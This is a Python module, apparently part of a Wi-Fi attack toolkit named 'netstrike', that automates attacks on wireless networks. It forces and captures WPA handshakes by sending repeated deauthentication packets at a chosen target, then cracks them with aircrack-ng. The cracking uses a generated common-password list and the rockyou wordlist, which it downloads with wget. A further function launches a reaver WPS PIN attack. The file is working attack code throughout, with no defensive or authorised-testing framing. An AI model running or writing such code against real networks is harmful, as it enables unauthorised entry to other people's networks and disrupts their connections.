#!/usr/bin/env python3

import os
import time
import subprocess

class PasswordCracker:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner

    def wpa_crack_attack(self):
        """WPA/WPA2 handshake capture and cracking"""
        print("\033[1;33m[!] INITIATING WPA CRACKING PROTOCOL...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💣] TARGET ACQUIRED: {target['essid']}\033[0m")
                
                cap_file = f"/tmp/netstrike_crack_{target['bssid'].replace(':', '_')}"
                
                # Set channel
                self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
                
                # Capture handshake
                print("\033[1;33m[!] CAPTURING HANDSHAKE FOR 30 SECONDS...\033[0m")
                
                capture_proc = self.core.run_command(
                    f"airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {cap_file} {self.core.mon_interface}",
                    background=True
                )
                
                time.sleep(10)
                
                # Send deauth to trigger handshake
                for i in range(3):
                    print("\033[1;34m[→] SENDING DEAUTH PACKETS...\033[0m")
                    self.core.run_command(f"aireplay-ng --deauth 5 -a {target['bssid']} {self.core.mon_interface}")
                    time.sleep(5)
                
                time.sleep(15)
                
                if capture_proc:
                    capture_proc.terminate()
                
                # Check for handshake
                if self.check_handshake(f"{cap_file}-01.cap"):
                    print("\033[1;32m[✓] HANDSHAKE CAPTURED SUCCESSFULLY!\033[0m")
                    self.smart_crack_handshake(f"{cap_file}-01.cap", target['bssid'], target['essid'])
                else:
                    print("\033[1;31m[✘] NO HANDSHAKE CAPTURED\033[0m")

    def check_handshake(self, cap_file):
        """Check if handshake was captured"""
        if not os.path.exists(cap_file):
            return False
        
        result = self.core.run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep '1 handshake'")
        return result and "1 handshake" in result.stdout

    def smart_crack_handshake(self, cap_file, bssid, essid):
        """Smart cracking with auto wordlist selection"""
        print("\033[1;33m[!] INITIATING SMART CRACKING...\033[0m")
        
        # Create basic wordlist
        basic_wordlist = self.create_basic_wordlist(essid)
        
        print("\033[1;36m[→] TRYING BASIC WORDLIST...\033[0m")
        
        result = self.core.run_command(
            f"aircrack-ng -w {basic_wordlist} -b {bssid} {cap_file} -l /tmp/cracked.txt -q"
        )
        
        if os.path.exists("/tmp/cracked.txt"):
            with open("/tmp/cracked.txt", 'r') as f:
                password = f.read().strip()
            print(f"\033[1;32m[🎉] PASSWORD CRACKED: {password}\033[0m")
            return True
        
        print("\033[1;33m[!] BASIC WORDLIST FAILED - DOWNLOADING LARGER WORDLIST...\033[0m")
        
        # Download rockyou wordlist if available
        rockyou_path = self.download_rockyou_wordlist()
        
        if rockyou_path and os.path.exists(rockyou_path):
            print("\033[1;36m[→] TRYING ROCKYOU WORDLIST...\033[0m")
            
            result = self.core.run_command(
                f"aircrack-ng -w {rockyou_path} -b {bssid} {cap_file} -l /tmp/cracked.txt -q"
            )
            
            if os.path.exists("/tmp/cracked.txt"):
                with open("/tmp/cracked.txt", 'r') as f:
                    password = f.read().strip()
                print(f"\033[1;32m[🎉] PASSWORD CRACKED: {password}\033[0m")
                return True
        
        print("\033[1;31m[✘] PASSWORD NOT CRACKED - TRY MORE ADVANCED ATTACKS\033[0m")
        return False

    def create_basic_wordlist(self, essid):
        """Create targeted basic wordlist"""
        wordlist_path = "/tmp/netstrike_wordlist.txt"
        
        common_passwords = [
            "12345678", "password", "admin123", "welcome", "qwerty",
            "letmein", "123456789", "password123", "admin", "welcome123",
            "1234567890", "1234", "12345", "123456", "1234567",
            "internet", "wireless", "default", "guest", "linksys",
            "dlink", "netgear", "cisco", "root", "toor"
        ]
        
        # Add ESSID-based variations
        if essid and essid != "HIDDEN_SSID":
            common_passwords.extend([
                essid, 
                essid + "123", 
                essid + "1234",
                essid + "12345",
                essid.lower(),
                essid.upper()
            ])
        
        with open(wordlist_path, 'w') as f:
            for pwd in common_passwords:
                f.write(pwd + '\n')
        
        return wordlist_path

    def download_rockyou_wordlist(self):
        """Download rockyou wordlist if not present"""
        rockyou_path = "/usr/share/wordlists/rockyou.txt"
        
        if os.path.exists(rockyou_path):
            return rockyou_path
        
        print("\033[1;33m[!] DOWNLOADING ROCKYOU WORDLIST...\033[0m")
        
        # Try to install wordlist
        self.core.run_command("apt update && apt install -y wordlists 2>/dev/null")
        
        if not os.path.exists(rockyou_path):
            # Try to download directly
            self.core.run_command(
                "wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /tmp/rockyou.txt 2>/dev/null"
            )
            if os.path.exists("/tmp/rockyou.txt"):
                return "/tmp/rockyou.txt"
        
        return rockyou_path if os.path.exists(rockyou_path) else None

    def wps_pin_attack(self):
        """WPS PIN attack"""
        print("\033[1;33m[!] SCANNING FOR WPS-ENABLED NETWORKS...\033[0m")
        
        # Scan for WPS networks
        wash_proc = self.core.run_command(
            f"timeout 30s wash -i {self.core.mon_interface}",
            background=True
        )
        
        time.sleep(30)
        
        if wash_proc:
            wash_proc.wait()
        
        target_bssid = input("\033[1;33m[?] ENTER WPS TARGET BSSID: \033[0m").strip()
        target_channel = input("\033[1;33m[?] ENTER TARGET CHANNEL: \033[0m").strip()
        
        if target_bssid and target_channel:
            print("\033[1;31m[💣] LAUNCHING WPS PIN ATTACK...\033[0m")
            
            self.core.run_command(
                f"reaver -i {self.core.mon_interface} -b {target_bssid} -c {target_channel} -vv -K 1",
                background=True
            )
            
            print("\033[1;32m[✓] WPS ATTACK DEPLOYED - CHECK TERMINAL FOR PROGRESS\033[0m")
        else:
            print("\033[1;31m[✘] INVALID TARGET DATA\033[0m")
